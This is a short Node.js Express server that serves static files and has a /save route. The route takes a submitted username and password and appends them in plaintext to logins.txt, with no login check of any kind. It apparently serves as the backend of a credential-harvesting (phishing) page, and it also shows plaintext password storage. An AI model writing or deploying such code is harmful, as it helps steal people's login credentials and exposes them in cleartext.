const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.static(__dirname)); // Serve HTML/CSS/JS
app.use(express.json()); // Parse JSON body

app.post('/save', (req, res) => {
    const { username, password } = req.body;
    const log = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('logins.txt', log, (err) => {
        if (err) {
            console.error('Error saving login:', err);
            res.status(500).send('Failed to save.');
        } else {
            res.send('Login saved successfully!');
        }
    });
});

app.listen(3000, () => {
    console.log('✅ Server running at http://localhost:3000');
});
